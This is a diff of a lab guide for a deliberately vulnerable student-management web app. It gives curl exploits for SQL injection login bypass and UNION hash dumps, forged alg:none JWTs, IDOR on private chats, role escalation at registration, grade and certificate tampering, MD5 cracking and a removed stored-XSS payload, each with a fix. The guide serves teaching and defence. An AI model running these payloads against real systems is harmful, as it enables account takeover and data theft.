@@ -1,41 +1,36 @@
-# Vulnerabilities — exploits & patches
+# Vulnerabilities — exploitation and fixes
 
-Every exploit below is reproduced with `curl` (copy/paste) and a note on how to do
-the same in **Burp Suite**. All commands assume the vulnerable server:
+Each entry lists where the flaw lives, how to exploit it (with `curl`; the same
+requests work in Burp Suite Repeater/Intruder), its impact, and the fix.
 
-```bash
-RESET_DB=1 APP_MODE=vuln python3 app.py     # http://127.0.0.1:3000
-```
-
-To confirm a fix, restart in secure mode and repeat the same request:
+Run the vulnerable build first:
 
 ```bash
-RESET_DB=1 APP_MODE=secure python3 app.py   # same requests should now fail
+RESET_DB=1 python3 app.py            # http://127.0.0.1:3000   (vuln)
 ```
 
-Base URL used below: `B=http://127.0.0.1:3000`
+To confirm a fix, run the secure build and repeat the request:
+
+```bash
+RESET_DB=1 APP_MODE=secure PORT=3001 python3 app.py
+```
+
+Shortcut used below: `B=http://127.0.0.1:3000`
 
 ---
 
-## 1. SQL injection
+## 1. SQL injection — login bypass
 
-**Where:** `app.py` → `h_login` and `h_search` (marked `# VULN: SQL injection`).
-**Why:** user input is concatenated directly into the SQL string.
+**Where:** `app.py → h_login`.
 
 ```python
-# h_login (vuln)
-sql = ("SELECT * FROM users WHERE username = '" + username + "' "
-       "AND password_hash = '" + pwd_md5 + "'")
-rows = db.vuln_query(conn, sql)
+# VULN
+sql = ("SELECT * FROM users WHERE username = '" + username +
+       "' AND password_hash = '" + pwd_md5 + "'")
 ```
 
-### Exploit A — login bypass (authenticate as admin with no password)
-
-Send `admin'-- ` as the username. The `--` comments out the password check:
-
-```
-SELECT * FROM users WHERE username = 'admin'-- ' AND password_hash = '...'
-```
+**Exploit** — log in as `admin` with no password. The `'--` comments out the
+password check:
 
 ```bash
 curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
@@ -43,275 +38,292 @@ curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
 # -> 200 with a valid admin JWT
 ```
 
-### Exploit B — UNION data exfiltration (dump password hashes + API keys)
+**Impact:** full authentication bypass as any user.
 
-The search endpoint selects 4 columns (`id, username, full_name, email`). Match
-that column count in a `UNION SELECT` to pull secrets into the result:
-
-```bash
-# first get any valid token (search requires auth) — or reuse the admin token above
-TOK=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
-      -d '{"username":"alice","password":"password1"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
-
-# payload:  zzz%' UNION SELECT id,username,password_hash,api_key FROM users--
-curl -s -G "$B/api/search" -H "Authorization: Bearer $TOK" \
-  --data-urlencode "q=zzz%' UNION SELECT id,username,password_hash,api_key FROM users-- "
-# -> every user's MD5 hash appears in "full_name" and api_key in "email"
-```
-
-**Burp:** capture the login/search request, send to **Repeater**, edit the JSON
-`username` / the `q=` parameter, replay. Try `' OR '1'='1`, `' UNION SELECT ...`,
-and time-based payloads.
-
-**Impact:** full authentication bypass and disclosure of every credential hash.
-Chains directly into finding #5 (the MD5 hashes crack instantly).
-
-### Patch
-
-Bind values as parameters — the SQL text and the data travel on separate channels,
-so input can never change the statement's structure:
+**Fix (secure build):**
 
 ```python
-# h_login (secure)
-rows = db.safe_query(conn, "SELECT * FROM users WHERE username = ?", (username,))
+rows = db.run(conn, "SELECT * FROM users WHERE username = ?", (username,))
 user = rows[0] if rows else None
 if user and not auth.verify_password(password, user):
     user = None
-
-# h_search (secure) — wildcards go into the VALUE, not the SQL
-rows = db.safe_query(conn,
-    "SELECT id, username, full_name, email FROM users WHERE full_name LIKE ?",
-    ("%" + q + "%",))
 ```
 
-**Verify fixed:** the login payload returns `401 invalid credentials`; the UNION
-payload returns `{"results": []}`.
+Parameterized queries send SQL and data on separate channels, so input can never
+change the statement. **Verify:** the payload now returns `401`.
 
 ---
 
-## 2. Authentication bypass
+## 2. SQL injection — certifications
 
-Two independent flaws, both under `# VULN: Auth bypass`.
-
-### 2a. JWT signature is never verified (and `alg:none` is accepted)
-
-**Where:** `auth.py` → `jwt_decode_vuln`.
+**Where:** `app.py → h_certifications`. The `student_id` query parameter is
+concatenated into a numeric context.
 
 ```python
-if header.get("alg") == "none":
-    return payload          # no signature required at all
-# ... otherwise still returns payload WITHOUT checking the signature
+# VULN
+sql = ("... WHERE c.student_id = " + str(student_id))
 ```
 
-**Exploit:** forge a token with any claims you like. No secret needed:
+**Exploit A** — read every student's certifications:
+
+```bash
+TOK=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
+      -d '{"username":"alice","password":"password1"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
+
+curl -s "$B/api/certifications?student_id=0%20OR%201=1" -H "Authorization: Bearer $TOK"
+```
+
+**Exploit B** — UNION to dump every user's password hash (7 columns to match):
+
+```bash
+curl -s -G "$B/api/certifications" -H "Authorization: Bearer $TOK" \
+  --data-urlencode "student_id=0 UNION SELECT id,role,username,password_hash,hash_scheme,NULL,full_name FROM users"
+# hashes appear in the 'title'/'grade' fields
+```
+
+**Impact:** disclosure of all certifications and, via UNION, all credential hashes.
+
+**Fix (secure build):** parameterize **and** authorize (a student may only read
+their own):
+
+```python
+if ident.get("role") == "student" and str(student_id) != str(ident.get("sub")):
+    return 403
+rows = db.run(conn, "... WHERE c.student_id = ?", (student_id,))
+```
+
+**Verify:** the `OR 1=1` / UNION payloads return `403`; a student requesting
+another student's id gets `403`.
+
+---
+
+## 3. Broken JWT authentication
+
+**Where:** `auth.py → jwt_decode_vuln`. The signature is never checked and
+`alg:none` is accepted.
+
+```python
+# VULN
+if header.get("alg") == "none":
+    return payload
+return payload           # signature never verified
+```
+
+**Exploit** — forge a token with `role: admin`, no secret required:
 
 ```bash
 FORGED=$(python3 - <<'PY'
 import auth, json
 h = auth.b64url_encode(json.dumps({"alg":"none","typ":"JWT"}).encode())
-p = auth.b64url_encode(json.dumps({"sub":2,"username":"alice","role":"admin"}).encode())
-print(f"{h}.{p}.")   # empty signature
+p = auth.b64url_encode(json.dumps({"sub":4,"username":"alice","role":"admin"}).encode())
+print(f"{h}.{p}.")
 PY
 )
-curl -s "$B/api/admin/users" -H "Authorization: Bearer $FORGED"   # -> full admin listing
+curl -s "$B/api/admin/users" -H "Authorization: Bearer $FORGED"     # -> full user list
 ```
 
-**Burp:** use the **JWT Editor** extension (or decode the base64 by hand in
-Decoder), change `"role"` to `admin` / `"alg"` to `none`, drop the signature, replay.
+In **Burp**, use the JWT Editor extension (or Decoder) to change the payload /
+set `alg:none`, drop the signature, and replay.
 
-### 2b. Forgeable "remember me" cookie
+**Impact:** any user can impersonate anyone and become admin.
 
-**Where:** `auth.py` → `remember_cookie_vuln` (cookie = `base64(username)`).
-
-```bash
-COOKIE=$(python3 -c 'import auth;print(auth.b64url_encode(b"admin"))')  # "YWRtaW4"
-curl -s "$B/api/me" -H "Cookie: remember=$COOKIE"    # -> you are now admin
-```
-
-**Impact:** anyone can impersonate any user / elevate to admin with zero secrets.
-
-### Patch
+**Fix (secure build):**
 
 ```python
-# auth.py — verify algorithm, signature (constant time), and expiry
-def jwt_decode_secure(token):
-    h_b64, p_b64, s_b64 = token.split(".")
-    header = json.loads(b64url_decode(h_b64))
-    if header.get("alg") != "HS256":                 # pin alg; reject 'none'
-        return None
-    expected = _sign(f"{h_b64}.{p_b64}".encode())
-    if not hmac.compare_digest(expected, s_b64):     # verify signature
-        return None
-    payload = json.loads(b64url_decode(p_b64))
-    if int(payload.get("exp", 0)) < time.time():     # enforce expiry
-        return None
-    return payload
+if header.get("alg") != "HS256":                       # reject none / confusion
+    return None
+if not hmac.compare_digest(_sign(f"{h}.{p}".encode()), s):  # verify signature
+    return None
+if payload["exp"] < time.time():                       # enforce expiry
+    return None
 ```
 
-Remember-me becomes a 256-bit random token; only its SHA-256 is stored in
-`remember_tokens` and looked up server-side (`new_remember_token_secure`).
-
-**Verify fixed:** the `alg:none` token and the `remember=YWRtaW4` cookie both
-return `401`. A *tampered* but otherwise-signed token also fails
-(`hmac.compare_digest` mismatch).
+**Verify:** the forged token returns `401`; a token whose payload was edited also
+fails (HMAC mismatch).
 
 ---
 
-## 3. Privilege escalation
+## 4. IDOR — read anyone's private conversation
 
-### 3a. Role chosen by the client at registration
+**Where:** `app.py → h_chat` (`GET /api/chat?chat_users[0]=..&chat_users[1]=..`).
+The conversation is chosen entirely by the two user ids in the URL, with no check
+that the caller is one of them.
 
-**Where:** `app.py` → `h_register`.
+In the app, opening one of your chats produces a URL like
+`…/#chat?chat_users[0]=4&chat_users[1]=5` — your id and the other person's. Editing
+those two numbers loads **any** two users' private conversation.
+
+**Exploit** — logged in as the student `alice` (id 4), read the private
+`admin`(1) ↔ `prof_smith`(2) conversation, which contains a secret:
+
+```bash
+TOK=<alice token>   # from localStorage after login, or via curl /api/login
+curl -s "$B/api/chat?chat_users[0]=1&chat_users[1]=2" -H "Authorization: Bearer $TOK"
+# -> "... the grading portal master password is Adm1n_Gu@rd14n_2026 ..."
+```
+
+In the browser you don't even need a tool: sign in as `alice`, open **Chat**, click
+a conversation, then change `chat_users[0]`/`chat_users[1]` in the address bar to
+`1` and `2`. **Burp Intruder** over the two ids enumerates every conversation.
+
+**Impact:** total confidentiality loss for private messages — including
+professor/admin chats. Note the query is parameterized (this is an *authorization*
+bug, not SQLi), and encryption at rest does **not** help: the server decrypts before
+responding, so you still need access control.
+
+**Fix (secure build):** you may only open a conversation you belong to (or admin):
 
 ```python
-role = body.get("role", "user")   # VULN: client controls its own role
+me = load_user(conn, ident.get("sub"))
+if not (me["role"] == "admin" or ident.get("sub") in (u0, u1)):
+    return 403
 ```
+
+**Verify:** as `alice`, `chat_users[0]=1&chat_users[1]=2` returns `403`; your own
+conversation (`4` & `5`) returns `200`.
+
+---
+
+## 5. Privilege escalation via registration
+
+**Where:** `app.py → h_register`. The role is taken from the request body.
+
+```python
+role = b.get("role", "student")     # VULN: client picks its own role
+```
+
+**Exploit:**
 
 ```bash
 curl -s -X POST $B/api/register -H 'Content-Type: application/json' \
-  -d '{"username":"eve","password":"x","role":"admin"}'      # eve is now admin
+  -d '{"username":"hacker","password":"x","role":"admin"}'      # -> role: admin
 ```
 
-### 3b. Admin gate trusts a client-supplied claim
-
-**Where:** `app.py` → `h_admin_users`.
-
-```python
-if ident.get("role") != "admin":   # VULN: 'role' comes from the (unverified) token
-    return 403
-```
-
-Combined with #2a, forging `role:admin` walks straight into the admin API.
-
-### Patch
-
-```python
-# h_register (secure): server assigns the role; the client field is ignored
-role = "user"
-
-# h_admin_users (secure): re-derive the role from the DB using the verified subject
-requester = load_user_by_id(conn, ident.get("sub"))
-if not requester or requester["role"] != "admin":
-    return 403
-```
-
-Principle: **authentication data may come from the token; authorization decisions
-must be re-checked against server-side state.**
-
-**Verify fixed:** registering with `role:admin` yields a `user`; the forged-admin
-token gets `403` at `/api/admin/users`, while a real admin login gets `200`.
+**Fix (secure build):** `role = "student"` — the server assigns roles.
+**Verify:** the new account comes back as `student`.
 
 ---
 
-## 4. Insecure Direct Object Reference (IDOR)
+## 6. Broken access control (missing function-level authorization)
 
-**Where:** `app.py` → `h_get_user`.
+Three endpoints perform privileged actions without checking the caller's role.
 
-```python
-# VULN: no authorization check — returns ANY user incl. api_key + password_hash
-user = load_user_by_id(conn, target_id)
-return public_user(user, include_sensitive=True)
-```
+### 6a. Grades — a student can change their own grade
 
-**Exploit:** as low-privileged `alice`, read the admin's record:
+**Where:** `app.py → h_set_grade`.
 
 ```bash
-curl -s "$B/api/users/1" -H "Authorization: Bearer $TOK"
-# -> admin's email, api_key, and password_hash
+# alice gives herself an A+ in course 1
+curl -s -X POST $B/api/grades -H "Authorization: Bearer $TOK" \
+  -H 'Content-Type: application/json' \
+  -d '{"course_id":1,"student_id":4,"grade":"A+"}'
 ```
 
-Iterate `1,2,3,…` to enumerate every account. **Burp Intruder** with a numeric
-payload on the `:id` position dumps them all.
+**Fix:** require admin, or the professor who owns that course.
 
-### Patch
+### 6b. Certifications — a student can issue themselves a fake diploma
 
-```python
-# secure: must be authenticated; only your own record unless admin; hide secrets
-if not (is_self or is_admin):
-    return 403
-return public_user(user, include_sensitive=is_self or is_admin)
+**Where:** `app.py → h_issue_cert`.
+
+```bash
+curl -s -X POST $B/api/certifications -H "Authorization: Bearer $TOK" \
+  -H 'Content-Type: application/json' \
+  -d '{"student_id":4,"title":"PhD in Computer Science","grade":"A+","issued_date":"2026-09-30"}'
 ```
 
-**Verify fixed:** `alice` reading `/api/users/1` (admin) → `403`; reading her own
-`/api/users/2` → `200` (own secrets OK); an admin can read anyone.
+**Fix:** admins only (and the cert is signed — see #8).
+
+### 6c. Admin user list trusts the token's role claim
+
+**Where:** `app.py → h_admin_users`. Combined with #3 this exposes every user
+(including password hashes). **Fix:** re-check the role from the database and never
+return hashes.
+
+**Verify (all three):** in the secure build each returns `403` for a student; a
+real admin/professor still succeeds where appropriate.
 
 ---
 
-## 5. Weak password hashing
+## 7. Insecure password hashing
 
-**Where:** `auth.py` → `hash_password` (`# VULN`) — unsalted **MD5**.
+**Where:** `auth.py → hash_password`. Passwords are stored as **unsalted MD5**.
 
-```python
-return hashlib.md5(password.encode()).hexdigest(), None, "md5"
-```
-
-**Exploit:** the hashes leaked via #1B / #4 crack instantly. `admin123` →
-`0192023a7bbd73250516f069df18b500`. Confirm with a reverse lookup or:
+**Exploit:** the hashes leaked in #2/#6c crack instantly. Every seeded password is
+a fast MD5:
 
 ```bash
 python3 -c 'import hashlib;print(hashlib.md5(b"admin123").hexdigest())'
 # 0192023a7bbd73250516f069df18b500  -> matches the dumped hash
+python3 -c 'import hashlib;print(hashlib.md5(b"qwerty").hexdigest())'
+# d8578edf8458ce06fbc5bb76a58c5ca4  -> carol
 ```
 
-Unsalted also means identical passwords share a hash (rainbow-table friendly).
+Unsalted also means equal passwords produce equal hashes.
 
-### Patch
+**Fix (secure build):** PBKDF2-HMAC-SHA256, per-user random salt, 200k iterations,
+constant-time comparison. **Verify:** `sqlite3 sms_secure.db "SELECT hash_scheme,salt
+FROM users"` shows `pbkdf2` with a salt; the hashes no longer reverse.
 
-```python
-# secure: per-user random salt + slow KDF (PBKDF2-HMAC-SHA256, 200k iterations)
-salt = secrets.token_hex(16)
-dk = hashlib.pbkdf2_hmac("sha256", password.encode(),
-                         bytes.fromhex(salt), PBKDF2_ITERATIONS)
-return dk.hex(), salt, "pbkdf2"
-# verification uses hmac.compare_digest (constant time)
-```
-
-> Production note: `bcrypt`, `scrypt`, or `argon2` are preferable to PBKDF2. PBKDF2
-> is used here because it ships in the Python standard library (no dependencies).
-
-**Verify fixed:** in secure mode `SELECT hash_scheme FROM users` shows `pbkdf2`
-with a 32-hex-char salt; the stored hash is not a bare MD5 and does not reverse.
+> In production prefer `bcrypt`/`scrypt`/`argon2`; PBKDF2 is used here because a
+> KDF is enough to make the point and it needs no extra service.
 
 ---
 
-## 6. Stored XSS *(bonus)*
+## 8. Cryptography — encryption at rest and certificate signatures
 
-**Where:** `static/app.js` → `listNotes` renders a note body with `innerHTML` in
-vuln mode; `app.py` → `h_create_note` stores it raw.
+Two protections are **absent** in the vuln build and **present** in the secure one.
 
-**Exploit:** create a note, then load the notes list to fire it:
+### 8a. Digital signatures on certifications (Ed25519)
+
+Vuln build stores certificates **unsigned** and never verifies them, so a forged
+certificate (see #6b) is indistinguishable from a real one — the API reports every
+cert as `verified: true`.
+
+Secure build signs each certificate with the issuer's Ed25519 key
+(`crypto_utils.sign_cert`) and verifies it on read (`verify_cert`). Any change to
+`student_id`, `title`, `grade` or `issued_date` breaks the signature:
 
 ```bash
-curl -s -X POST $B/api/notes -H "Authorization: Bearer $TOK" \
-  -H 'Content-Type: application/json' \
-  -d '{"title":"pwn","body":"<img src=x onerror=alert(document.cookie)>"}'
+# secure build: tamper a grade directly in the DB, keep the old signature
+sqlite3 sms_secure.db "UPDATE certifications SET grade='A+' WHERE title='Python Developer';"
+# the API now reports that certificate as  verified: false
 ```
 
-Open the UI, click **Refresh notes** → the payload executes.
+The public key is served at `GET /api/pubkey` so a third party can verify
+independently. This is the **HMAC / digital-signature** requirement — HMAC-SHA256
+also protects the JWT (see #3).
 
-### Patch
+### 8b. Encryption at rest for messages (AES-256-GCM)
 
-Encode on output (primary) and neutralize on input (defense in depth):
+Vuln build stores message bodies in plaintext — anyone with the DB file reads
+everything:
 
-```javascript
-bodySpan.textContent = n.body || "";   // secure: never parsed as HTML
+```bash
+sqlite3 sms_vuln.db "SELECT subject, body FROM messages LIMIT 3;"   # readable
 ```
-```python
-note_body = html.escape(note_body)     # secure: stored escaped
+
+Secure build encrypts bodies with AES-256-GCM (`crypto_utils.encrypt`) before
+storing them:
+
+```bash
+sqlite3 sms_secure.db "SELECT subject, body FROM messages LIMIT 3;"  # ciphertext
 ```
 
-**Verify fixed:** in secure mode the payload is displayed as literal text and does
-not execute.
+**Defense-in-depth note:** encryption at rest protects the *database file*; it does
+**not** fix the IDOR in #4, because the server decrypts before responding. You need
+both access control *and* encryption.
 
 ---
 
-## Coverage summary
+## Summary
 
-| # | Vulnerability | Reproduced | Patched & re-verified |
-|---|---------------|:----------:|:---------------------:|
-| 1 | SQL injection (login bypass + UNION dump) | ✅ | ✅ |
-| 2 | Auth bypass (JWT no-verify / `alg:none` + remember-me) | ✅ | ✅ |
-| 3 | Privilege escalation (register role + claim-trusting authz) | ✅ | ✅ |
-| 4 | IDOR (user records incl. secrets) | ✅ | ✅ |
-| 5 | Weak password hashing (unsalted MD5) | ✅ | ✅ |
-| 6 | Stored XSS (note rendering) | ✅ | ✅ |
+| # | Vulnerability | Fix |
+|---|---------------|-----|
+| 1 | SQLi login bypass | parameterized query |
+| 2 | SQLi in certifications | parameterized query + authorization |
+| 3 | JWT not verified / `alg:none` | pin alg, verify HMAC, check exp |
+| 4 | IDOR on chat conversations | ownership/role check |
+| 5 | Privilege escalation at registration | server-assigned role |
+| 6 | Broken access control (grades/certs/admin) | server-side role checks |
+| 7 | Unsalted MD5 passwords | PBKDF2 + salt |
+| 8 | No signatures / no encryption at rest | Ed25519 signatures + AES-GCM |
